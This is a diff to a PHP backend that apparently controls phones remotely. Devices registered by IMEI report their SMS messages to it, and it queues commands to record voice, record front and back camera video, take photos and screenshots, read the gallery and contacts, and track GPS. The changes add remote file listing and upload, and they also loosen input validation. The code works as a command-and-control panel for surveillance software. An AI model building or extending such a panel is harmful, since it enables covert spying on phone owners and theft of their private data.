@@ -30,7 +30,17 @@ switch ($_REQUEST["act"]) {
             exit;
         }
         $_SESSION["device"]["id"] = $_REQUEST["id"];
-        controller_main_function::send_msg(lang::$success, lang::$message, "success");
+       // controller_main_function::send_msg(lang::$success, lang::$message, "success");
+        $result = true;
+        send_result($result);
+        break;
+    case 'get_device':
+        if(isset($_SESSION["device"]["id"]) && $_SESSION["device"]["id"]!=null && $_SESSION["device"]["id"] !='') {
+            $result = $_SESSION["device"]["id"];
+        }else{
+            $result = false;
+        }
+        send_result($result);
         break;
     case 'check_is_select_device':
         if(isset($_SESSION["device"]["id"])){
@@ -78,7 +88,7 @@ switch ($_REQUEST["act"]) {
         $_SESSION['user'] = access::get_user_by_email_pass($_REQUEST['email'], $_REQUEST['pass']);
         if (isset($_SESSION['user']) && isset($_SESSION['user'][0]['email'])) {//ß== $_REQUEST['email'])){
             access::set_user_login($_SESSION['user'][0]['id']);
-            send_result(array('Result' => 'index.html', 'act' => 'location'));
+            send_result(array('Result' => 'pages/SelectDevices.html', 'act' => 'location'));
             exit;
         } else {
             send_msg(lang::$is_not_login, lang::$error);
@@ -226,9 +236,9 @@ switch ($_REQUEST["act"]) {
         }
         $device_id = access::get_device_by_IMEI($_REQUEST["IMEI"]);
         $device_id = $device_id[0]["id"];
-        if (isset($device_id[0]["id"])) {
+        if (isset($device_id)) {
             $dd= '"'.date('Y-m-d H:i:s',($_REQUEST['registerDate']/1000)).'"';
-            $result = access::set_sms($_REQUEST["number"], $_REQUEST["text"], 0, $_REQUEST['smsId'], $dd, 0, 2, $device_id[0]["id"], 1);
+            $result = access::set_sms($_REQUEST["number"], $_REQUEST["text"], 0, $_REQUEST['smsId'], $dd, 0, 2, $device_id, 1);
             if ($result > 0 && isset($result)) {
                 send_msg(lang::$success, lang::$message, "success");
             } else {
@@ -399,12 +409,8 @@ switch ($_REQUEST["act"]) {
         break;
 
     case 'get_contact_by_deviceId':
-        $valid_data = check_validation(array("deviceId"));
-        if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
-            send_msg(lang::$invalid_data, lang::$error);
-            exit;
-        }
-        $result = access::get_contact_by_deviceId($_REQUEST['deviceId']);
+        $device_id = $_SESSION["device"]["id"];
+        $result = access::get_contact_by_deviceId($device_id);
         send_result($result);
         break;
 
@@ -429,8 +435,8 @@ switch ($_REQUEST["act"]) {
         } else if (isset($_REQUEST["deviceId"]) && $_REQUEST["deviceId"] != "") {
             $device_id = $_REQUEST["deviceId"];
         } else {
-            send_msg(lang::$invalid_data, lang::$error);
-            exit;
+            $device_id = $_SESSION["device"]["id"];
+
         }
 
         if (isset($_REQUEST["contactID"]) && $_REQUEST["contactID"] != '') {
@@ -462,8 +468,7 @@ switch ($_REQUEST["act"]) {
         } else if (isset($_REQUEST["deviceId"]) && $_REQUEST["deviceId"] != "") {
             $device_id = $_REQUEST["deviceId"];
         } else {
-            send_msg(lang::$invalid_data, lang::$error);
-            exit;
+            $device_id = $_SESSION["device"]["id"];
         }
 
         if (isset($_REQUEST["contactID"]) && $_REQUEST["contactID"] != '') {
@@ -502,14 +507,16 @@ switch ($_REQUEST["act"]) {
 
     ///end summery
     case 'get_ls':
-        $valid_data = check_validation(array("deviceId", "path"));
+        $valid_data = check_validation(array("path"));
         if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
             send_msg(lang::$invalid_data, lang::$error);
             exit;
         }
         $path = $_REQUEST["path"];
         if($path == "root"){$path= 0;}
-        access::set_request($_REQUEST["deviceId"],5,$path);
+        $device_id = $_SESSION["device"]["id"];
+        access::set_request($device_id,5,$path);
+        send_msg(lang::$success, lang::$message, "success");
         break;
     case 'response_get_ls':
         $valid_data = check_validation(array("id"));
@@ -522,24 +529,27 @@ switch ($_REQUEST["act"]) {
         break;
     /// if file_type = empty then the row is folder
     case 'set_ls':
-        $valid_data = check_validation(array("IEMI","file_name" , "file_type","parent"));
+        $valid_data = check_validation(array("IMEI","file_name","file_type","parent"));
         if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
             send_msg(lang::$invalid_data, lang::$error);
             exit;
         }
         $deviceId = access::get_device_by_IMEI($_REQUEST["IMEI"]);
+        $deviceId = $deviceId[0]["id"];
         access::set_directory($_REQUEST['file_name'], $_REQUEST['file_type'], $_REQUEST['parent'], $deviceId);
         send_msg(lang::$success, lang::$message, "success");
         break;
     case 'upload_request':
-        $valid_data = check_validation(array("deviceId", "pathId"));
+        $valid_data = check_validation(array("pathId"));
         if (!isset($valid_data['is_valid']) || $valid_data['is_valid'] == false) {
             send_msg(lang::$invalid_data, lang::$error);
             exit;
         }
         $path = $_REQUEST["pathId"];
         if($path == "root"){$path= 0;}
-        access::set_request($_REQUEST["deviceId"],13,$path);
+        $device_id = $_SESSION["device"]["id"];
+        access::set_request($device_id,13,$path);
+        send_msg(lang::$success, lang::$message, "success");
 
         break;
     case 'upload_file':
@@ -817,6 +827,7 @@ switch ($_REQUEST["act"]) {
             $contact = access::get_contact_request_by_deviceId($device_id[0]['id']);
             $gps_start = access::get_Request(3,$device_id[0]['id']);
             $gps_stop = access::get_Request(4,$device_id[0]['id']);
+            $get_ls = access::get_ls_request_by_deviceId($device_id[0]['id']);
             $record_voice = access::get_Request(6,$device_id[0]['id']);
             $recorde_video_front_camera = access::get_Request(7,$device_id[0]['id']);
             $record_video_back_camera = access::get_Request(8,$device_id[0]['id']);
@@ -824,6 +835,7 @@ switch ($_REQUEST["act"]) {
             $take_photo_back_camera = access::get_Request(10,$device_id[0]['id']);
             $take_screenshot = access::get_Request(11,$device_id[0]['id']);
             $get_gallery = access::get_Request(12,$device_id[0]['id']);
+            $upload_request = access::get_dir_request_by_deviceId($device_id[0]['id']);
             $result = array();
             $index_result = 0;
             for ($index = 0; $index < count($sms); $index++) {
@@ -840,6 +852,10 @@ switch ($_REQUEST["act"]) {
             }
             for ($index = 0; $index < count($gps_stop); $index++) {
                 $result[$index_result] = $gps_stop[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($get_ls); $index++) {
+                $result[$index_result] = $get_ls[$index];
                 $index_result++;
             }
             for ($index = 0; $index < count($record_voice); $index++) {
@@ -868,6 +884,10 @@ switch ($_REQUEST["act"]) {
             }
             for ($index = 0; $index < count($get_gallery); $index++) {
                 $result[$index_result] = $get_gallery[$index];
+                $index_result++;
+            }
+            for ($index = 0; $index < count($upload_request); $index++) {
+                $result[$index_result] = $upload_request[$index];
                 $index_result++;
             }
             send_result($result);
